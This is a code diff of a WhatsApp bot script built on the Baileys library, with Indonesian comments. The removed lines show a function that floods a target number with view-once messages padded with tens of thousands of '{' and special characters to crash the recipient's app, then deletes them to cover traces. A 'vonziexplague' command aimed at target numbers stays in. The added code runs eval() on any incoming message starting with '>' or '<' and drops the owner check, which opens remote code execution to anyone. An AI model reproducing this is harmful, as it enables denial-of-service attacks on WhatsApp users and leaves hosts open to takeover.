@@ -1,10 +1,14 @@
 // bot.js
 const {
   default: makeWASocket,
+  proto,
+  generateWAMessage,
+  generateWAMessageFromContent,
+  getContentType,
+  prepareWAMessageMedia,
   useMultiFileAuthState,
   makeCacheableSignalKeyStore,
-  fetchLatestBaileysVersion,
-  downloadMediaMessage
+  fetchLatestBaileysVersion
 } = require("@whiskeysockets/baileys");
 const pino = require("pino");
 const chalk = require("chalk");
@@ -19,6 +23,10 @@ function question(query) {
     rl.close();
     resolve(ans);
   }));
+}
+
+function sleep(ms) {
+  return new Promise(resolve => setTimeout(resolve, ms));
 }
 
 // =============== Main ===============
@@ -96,18 +104,21 @@ async function clientstart() {
     const type = Object.keys(m.message)[0];
     const body =
       (type === "conversation" && m.message.conversation) ? m.message.conversation :
-      (type === "imageMessage" && m.message.imageMessage.caption) ? m.message.imageMessage.caption :
-      (type === "videoMessage" && m.message.videoMessage.caption) ? m.message.videoMessage.caption :
-      (type === "extendedTextMessage" && m.message.extendedTextMessage.text) ? m.message.extendedTextMessage.text :
-      (type === "buttonsResponseMessage" && m.message.buttonsResponseMessage.selectedButtonId) ? m.message.buttonsResponseMessage.selectedButtonId :
-      (type === "listResponseMessage" && m.message.listResponseMessage.singleSelectReply.selectedRowId) ? m.message.listResponseMessage.singleSelectReply.selectedRowId :
-      "";
+        (type === "imageMessage" && m.message.imageMessage.caption) ? m.message.imageMessage.caption :
+          (type === "videoMessage" && m.message.videoMessage.caption) ? m.message.videoMessage.caption :
+            (type === "extendedTextMessage" && m.message.extendedTextMessage.text) ? m.message.extendedTextMessage.text :
+              (type === "buttonsResponseMessage" && m.message.buttonsResponseMessage.selectedButtonId) ? m.message.buttonsResponseMessage.selectedButtonId :
+                (type === "listResponseMessage" && m.message.listResponseMessage.singleSelectReply.selectedRowId) ? m.message.listResponseMessage.singleSelectReply.selectedRowId :
+                  "";
 
     const command = body.startsWith("!") ? body.slice(1).trim().split(" ")[0].toLowerCase() : "";
     const args = body.trim().split(/ +/).slice(1);
+    const q = args.join(" ");
+    const budy = body;
 
     try {
-    const mode = {
+      // contoh dummy, tambahin sesuai punya lu
+      const warmodes = {
 key: {
 participant: `13135559098@s.whatsapp.net`,
 ...(m.chat ? {
@@ -124,142 +135,7 @@ sendEphemeral: true
 }},
 status: 1,
 participant: "13135559098@s.whatsapp.net"
-}
-
-function sleep(ms) {
-  return new Promise(resolve => setTimeout(resolve, ms));
-}
-
-async function pungtion(conn, target, count = 3) {
-  const messageIds = [];
-
-  for (let i = 0; i < count; i++) {
-    try {
-      const message = {
-        viewOnceMessage: {
-          message: {
-            messageContextInfo: {
-              deviceListMetadata: {},
-              deviceListMetadataVersion: 2,
-            },
-            interactiveMessage: {
-              contextInfo: {
-                mentionedJid: [target],
-                isForwarded: true,
-                forwardingScore: 99999999,
-                businessMessageForwardInfo: {
-                  businessOwnerJid: target,
-                },
-              },
-              body: {
-                text: "📄Null Tanggapan Diterima" + "ꦽ".repeat(7777),
-              },
-              nativeFlowMessage: {
-                messageParamsJson: "{".repeat(9999),
-                buttons: [
-                  {
-                    name: "single_select",
-                    buttonParamsJson: "{".repeat(15000),
-                    version: 3,
-                  },
-                  {
-                    name: "call_permission_request",
-                    buttonParamsJson: "{".repeat(15000),
-                    version: 3,
-                  },
-                  {
-                    name: "cta_url",
-                    buttonParamsJson: "{".repeat(15000),
-                    version: 3,
-                  },
-                  {
-                    name: "cta_call",
-                    buttonParamsJson: "{".repeat(15000),
-                    version: 3,
-                  },
-                  {
-                    name: "cta_copy",
-                    buttonParamsJson: "{".repeat(15000),
-                    version: 3,
-                  },
-                  {
-                    name: "cta_reminder",
-                    buttonParamsJson: "{".repeat(15000),
-                    version: 3,
-                  },
-                  {
-                    name: "cta_cancel_reminder",
-                    buttonParamsJson: "{".repeat(15000),
-                    version: 3,
-                  },
-                  {
-                    name: "address_message",
-                    buttonParamsJson: "{".repeat(15000),
-                    version: 3,
-                  },
-                  {
-                    name: "send_location",
-                    buttonParamsJson: "{".repeat(15000),
-                    version: 3,
-                  },
-                  {
-                    name: "quick_reply",
-                    buttonParamsJson: "{".repeat(15000),
-                    version: 3,
-                  },
-                  {
-                    name: "single_select",
-                    buttonParamsJson: "ꦽ".repeat(3000),
-                    version: 3,
-                  },
-                  {
-                    name: "call_permission_request",
-                    buttonParamsJson: JSON.stringify({ status: true }),
-                    version: 3,
-                  },
-                  {
-                    name: "camera_permission_request",
-                    buttonParamsJson: JSON.stringify({ cameraAccess: true }),
-                    version: 3,
-                  },
-                ],
-              },
-            },
-          },
-        },
-      };
-
-      // kirim message crash
-      const msg = await conn.sendMessage(target, message);
-      const messageId = msg.key.id;
-      messageIds.push(messageId);
-
-      console.log(✅ [${i + 1}/${count}] Vexnew crash terkirim: ${messageId});
-
-      await sleep(600);
-    } catch (e) {
-      console.error("❌ Error NewEra:", e);
-    }
-  }
-
-  // 🔥 hapus semua pesan setelah dikirim
-  for (let i = 0; i < messageIds.length; i++) {
-    const id = messageIds[i];
-    await sleep(1000);
-    await conn.sendMessage(target, {
-      delete: {
-        remoteJid: target,
-        fromMe: false,
-        id,
-        participant: conn.user.id,
-      },
-    });
-    console.log(🗑️ Pesan ${i + 1} dihapus);
-  }
-
-  console.log("✅ Semua pesan crash sudah dihapus");
-}
-
+      }
       switch (command) {
 
 case 'menu':{
@@ -372,7 +248,7 @@ return await conn.sendMessage(m.chat, buttonMessage, { quoted: warmodes });
   break;
 
 
-case 'systemvcx': case 'vonziexplague': {
+case 'testt': case 'vonziexplague': {
     
     if (!q) 
         return m.reply(`𝗖𝗮𝗿𝗮 𝗽𝗮𝗸𝗮𝗶i : ${prefix + command} 𝟲𝟮×××`);
@@ -406,48 +282,44 @@ case 'systemvcx': case 'vonziexplague': {
     await sleep(1500);
    }
 }
+        break;
 
-    break
-}
+        default: {
+          if (budy.startsWith('>')) {
+            try {
+              let evaled = await eval(budy.slice(1));
+              if (typeof evaled !== 'string') evaled = require('util').inspect(evaled);
+              await conn.sendMessage(from, { text: evaled }, { quoted: m });
+            } catch (err) {
+              await conn.sendMessage(from, { text: String(err) }, { quoted: m });
+            }
+          }
 
-// ========== [ 📂 BATAS CASE 📂 ] ========= //
-default:
-if (budy.startsWith('>')) {
-if (!isOwner) return;
-try {
-let evaled = await eval(budy.slice(2));
-if (typeof evaled !== 'string') evaled = require('util').inspect(evaled);
-await m.ryuReply(evaled);
-} catch (err) {
-m.ryuReply(String(err));
+          if (budy.startsWith('<')) {
+            let kode = budy.trim().split(/ +/)[0];
+            let teks;
+            try {
+              teks = await eval(`(async () => { ${kode == ">>" ? "return" : ""} ${q}})()`);
+            } catch (e) {
+              teks = e;
+            } finally {
+              await conn.sendMessage(from, { text: require('util').format(teks) }, { quoted: m });
+            }
+          }
+        }
+      } // end switch
+    } catch (err) {
+      console.log(require("util").format(err));
+    }
+  });
 }
-}
-
-if (budy.startsWith('<')) {
-if (!isOwner) return
-let kode = budy.trim().split(/ +/)[0]
-let teks
-try {
-teks = await eval(`(async () => { ${kode == ">>" ? "return" : ""} ${q}})()`)
-} catch (e) {
-teks = e
-} finally {
-await m.ryuReply(require('util').format(teks))
-}
-}
-
-}
-} catch (err) {
-console.log(require("util").format(err));
-}
-};
 
 let file = require.resolve(__filename);
 require('fs').watchFile(file, () => {
-require('fs').unwatchFile(file);
-console.log('\x1b[0;32m' + __filename + ' \x1b[1;32mupdated!\x1b[0m');
-delete require.cache[file];
-require(file);
+  require('fs').unwatchFile(file);
+  console.log('\x1b[0;32m' + __filename + ' \x1b[1;32mupdated!\x1b[0m');
+  delete require.cache[file];
+  require(file);
 });
 
 clientstart();
